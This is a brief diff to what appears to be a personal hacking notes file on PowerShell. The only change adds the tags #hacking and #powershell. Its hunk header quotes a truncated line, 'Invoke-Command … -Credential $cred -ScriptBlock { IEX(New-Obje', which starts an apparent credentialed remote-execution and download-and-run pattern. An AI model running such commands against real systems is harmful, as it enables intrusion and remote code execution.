@@ -18,4 +18,4 @@ Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { IEX(New-Obje
 - ~/kb/hacking/powershell/powershell-enumeration-commands.md
 
 Tags:
-    #assorted #command
+    #assorted #command #hacking #powershell
